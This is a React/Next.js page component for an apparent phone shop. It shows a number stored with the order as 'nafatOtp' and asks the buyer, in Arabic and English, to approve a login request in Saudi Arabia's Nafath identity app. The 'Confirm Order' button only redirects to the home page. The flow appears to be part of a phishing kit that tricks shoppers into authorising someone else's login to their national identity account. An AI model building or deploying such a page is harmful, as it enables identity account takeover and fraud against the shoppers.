import { Pagination, Autoplay, A11y, EffectCards } from 'swiper/modules'
import { Swiper, SwiperSlide } from 'swiper/react'
import SwiperCore from 'swiper'
import { FaArrowRightLong } from 'react-icons/fa6'
import { useRouter, useSearchParams } from 'next/navigation'

// Import Swiper styles
import 'swiper/css'
import 'swiper/css/navigation'
import 'swiper/css/pagination'
import 'swiper/css/scrollbar'
import 'swiper/css/free-mode'
import 'swiper/css/thumbs'
import toast from 'react-hot-toast'
import Link from 'next/link'
import { useEffect, useState } from 'react'

const NafatApp = () => {
  SwiperCore.use([Autoplay])
  const router = useRouter()
  const params = useSearchParams()

  // get order data from api localhost:3000/api/order/:id
  const [order, setOrder] = useState([])

  useEffect(() => {
    params.get('id') &&
      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`)
        .then((res) => res.json())
        .then((data) => {
          setOrder(data)
        })
        .catch((err) => {
          alert(`Please enter correct otp ~ ${err}`)
        })
  }, [params])

  const handleSubmit = (e) => {
    e.preventDefault()
    router.push('/')
    toast.success('Your order has been confirmed')
  }

  return (
    <>
      {/* create a form so that I can add user-name, email, phone number etc add some design also */}
      <Swiper
        // install Swiper modules
        modules={[Pagination, A11y, EffectCards]}
        spaceBetween={50}
        slidesPerView={1}
        loop={true}
        autoplay={{
          delay: 2500,
          disableOnInteraction: false,
        }}
        pagination={{ clickable: true }}
        // onSwiper={(swiper) => console.log(swiper)}
        // onSlideChange={() => console.log('slide change')}
      >
        <SwiperSlide className="!h-[300px] w-full bg-[url('/images/slider-background-girl.jpg')] bg-center bg-cover bg-no-repeat">
          <div className="h-[300px] flex flex-col justify-center items-end mx-40 ">
            <h1 className="text-4xl font-bold text-gray-600">IPhone 14</h1>
            <button className="py-3 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out">
              Order Now <FaArrowRightLong size={16} />
            </button>
          </div>
        </SwiperSlide>
        <SwiperSlide className="!h-[300px] w-full bg-[url('/images/slider-background-human.jpg')] bg-center bg-cover bg-no-repeat">
          <div className="h-[300px] flex flex-col justify-center items-end mx-40 ">
            <h1 className="text-4xl font-bold text-gray-600">
              IPhone 14 Pro Max
            </h1>
            <button className="py-3 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out">
              Order Now <FaArrowRightLong size={16} />
            </button>
          </div>
        </SwiperSlide>
        <SwiperSlide className="!h-[300px] w-full bg-[url('/images/slider-background.jpg')] bg-center bg-cover bg-no-repeat">
          <div className="h-[300px] flex flex-col justify-center items-start mx-40">
            <h1 className="text-4xl font-bold text-gray-600">
              Buy Your Dreams
            </h1>
            <button className="py-3 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out">
              Order Now <FaArrowRightLong size={16} />
            </button>
          </div>
        </SwiperSlide>
      </Swiper>
      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
        <h1 className="text-4xl font-bold text-gray-600 mt-10">Nafat App</h1>
        {/* make this link as a button */}

        <p className="text-gray-600 text-center mt-5 font-bold">
          رجى قبول طلب تسجيل الدخول من تطبيق نفاذ
        </p>
        <p className="text-gray-600 text-center my-5 font-bold">
          Please accept the login request from Nafath app
        </p>
        {/* a countdown design round border */}

        <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
          <p className="text-gray-600 text-center m-0 font-bold">
            {order.nafatOtp ? order.nafatOtp : 'N/A'}
          </p>
        </div>

        <Link
          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
          target="_blank"
          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
        >
          OPEN NAFATH APP
        </Link>
        <form onSubmit={handleSubmit} className="w-3/4 my-14">
          <button
            type="submit"
            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
          >
            Confirm Order <FaArrowRightLong size={16} />
          </button>
        </form>
      </div>
      <div className="h-20 bg-teal-400 mt-5"></div>
    </>
  )
}

export default NafatApp
